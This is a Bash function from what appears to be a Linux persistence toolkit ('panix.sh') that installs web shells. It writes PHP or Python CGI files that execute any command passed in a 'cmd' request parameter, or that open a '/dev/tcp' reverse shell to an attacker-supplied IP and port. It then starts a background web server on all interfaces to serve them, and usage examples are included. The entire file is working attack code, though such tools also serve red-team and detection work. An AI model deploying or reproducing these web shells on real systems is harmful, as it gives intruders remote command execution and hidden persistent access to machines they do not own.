setup_web_shell() {
	local port=""
	local rev_port=""
	local language=""
	local mechanism=""
	local ip=""

	usage_web_shell() {
		echo "Usage: ./panix.sh --web-shell [OPTIONS]"
		echo "  --mechanism <cmd|reverse>             Specify mechanism (cmd for command execution, reverse for reverse shell)"
		echo "  --language <php|python>               Specify language for the web server"
		echo "  --port <port>                         Specify port for the web server"
		echo "  --rev-port <port>                     Specify port for the reverse shell"
		echo "  --ip <ip>                             Required for reverse mechanism, specify the attacker's IP"
		echo "  --examples                            Display command examples"
		echo "  --help|-h                             Show this help message"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--port )
				shift
				port=$1
				;;
			--rev-port )
				shift
				rev_port=$1
				;;
			--language )
				shift
				language=$1
				;;
			--mechanism )
				shift
				mechanism=$1
				;;
			--ip )
				shift
				ip=$1
				;;
			--examples )
				echo "Examples:"
				echo "./panix.sh --web-shell --port 8080 --language php --mechanism cmd"
				echo "./panix.sh --web-shell --port 8080 --language python --mechanism reverse --ip 10.10.10.10 --rev-port 1337"
				exit 0
				;;
			--help|-h )
				usage_web_shell
				exit 0
				;;
			* )
				echo "Invalid option: $1"
				echo "Try './panix.sh --web-shell --help' for more information."
				exit 1
		esac
		shift
	done

	# Validate required arguments
	if [[ -z $port || -z $language || -z $mechanism ]]; then
		echo "Error: --port, --language, and --mechanism must be specified."
		echo "Try './panix.sh --web-shell --help' for more information."
		exit 1
	fi

	if [[ $mechanism == "reverse" && ( -z $ip || -z $rev_port ) ]]; then
		echo "Error: --ip and --rev-port must be specified when using the reverse mechanism."
		echo "Try './panix.sh --web-shell --help' for more information."
		exit 1
	fi

	# Determine web server directory based on user privileges
	if [[ $UID -eq 0 ]]; then
		dir="/var/www/html/panix/"
	else
		dir="$HOME/panix/"
	fi

	mkdir -p "$dir"
	echo "[+] Web server directory created at $dir"

	# Create appropriate file based on mechanism
	case $mechanism in
		cmd )
			if [[ $language == "php" ]]; then
				echo "<?php if(isset(\$_REQUEST['cmd'])){\$cmd=(\$_REQUEST['cmd']);system(\$cmd);die;}?>" > "${dir}cmd.php"
				echo "[+] cmd.php file created in $dir"
				echo "[+] Interact via: curl http://<ip>:$port/cmd.php?cmd=whoami"
			elif [[ $language == "python" ]]; then
				cgi_dir="${dir}cgi-bin/"
				mkdir -p "$cgi_dir"
cat <<EOF > "${cgi_dir}cmd.py"
#!/usr/bin/env python3
import os, cgi

form = cgi.FieldStorage()
cmd = form.getvalue('cmd', '')

if cmd:
	print("Content-Type: text/plain\\n")
	print(os.popen(cmd).read())
EOF
				chmod +x "${cgi_dir}cmd.py"
				echo "[+] cmd.py file created in $cgi_dir"
				echo "[+] Interact via: curl http://<ip>:$port/cgi-bin/cmd.py?cmd=whoami"
			else
				echo "[-] Error: Unsupported language specified for cmd mechanism."
				exit 1
			fi
			;;
		reverse )
			if [[ $language == "php" ]]; then
				echo "<?php exec(\"/bin/bash -c 'nohup setsid bash -i > /dev/tcp/$ip/$rev_port 0>&1'\");?>" > "${dir}reverse.php"
				echo "[+] reverse.php file created in $dir"
				echo "[+] Interact via: curl http://<ip>:$port/reverse.php"
			elif [[ $language == "python" ]]; then
				cgi_dir="${dir}cgi-bin/"
				mkdir -p "$cgi_dir"
				cat <<-EOF > "${cgi_dir}reverse.py"
				#!/usr/bin/env python3
				import os
				os.system("/bin/bash -c 'nohup setsid bash -i > /dev/tcp/$ip/$rev_port 0>&1'")
				EOF
				chmod +x "${cgi_dir}reverse.py"
				echo "[+] reverse.py file created in $cgi_dir"
				echo "[+] Interact via: curl http://<ip>:$port/cgi-bin/reverse.py"
			else
				echo "[-] Error: Unsupported language specified for reverse mechanism."
				exit 1
			fi
			;;
		* )
			echo "[-] Error: Invalid mechanism specified. Use cmd or reverse."
			exit 1
	esac

	# Start web server
	case $language in
		php )
			if command -v php &>/dev/null; then
				if lsof -i :"$port" &>/dev/null; then
					echo "[-] Error: A process is already running on port $port. Aborting."
					exit 1
				fi
				echo "[!] Starting PHP server on port $port..."
				nohup php -S 0.0.0.0:$port -t "$dir" &>/dev/null &
				echo "[+] PHP server running in the background at port $port."
			else
				echo "[-] Error: PHP is not installed on this system."
				exit 1
			fi
			;;
		python )
			if command -v python3 &>/dev/null; then
				if lsof -i :"$port" &>/dev/null; then
					echo "[-] Error: A process is already running on port $port. Aborting."
					exit 1
				fi
				echo "[!] Starting Python3 server on port $port with CGI enabled..."
				cgi_dir="${dir}cgi-bin/"
				cd "$dir"
				nohup python3 -m http.server --cgi $port &>/dev/null &
				echo "[+] Python3 server running in the background at port $port."
			elif command -v python &>/dev/null; then
				if lsof -i :"$port" &>/dev/null; then
					echo "[-] Error: A process is already running on port $port. Aborting."
					exit 1
				fi
				echo "[!] Starting Python2 server on port $port with CGI enabled..."
				cgi_dir="${dir}cgi-bin/"
				cd "$dir"
				nohup python -m CGIHTTPServer $port &>/dev/null &
				echo "[+] Python2 server running in the background at port $port."
			else
				echo "[-] Error: Neither Python3 nor Python2 is installed on this system."
				exit 1
			fi
			;;
		* )
			echo "[-] Error: Unsupported language specified. Use php or python."
			exit 1
	esac
}
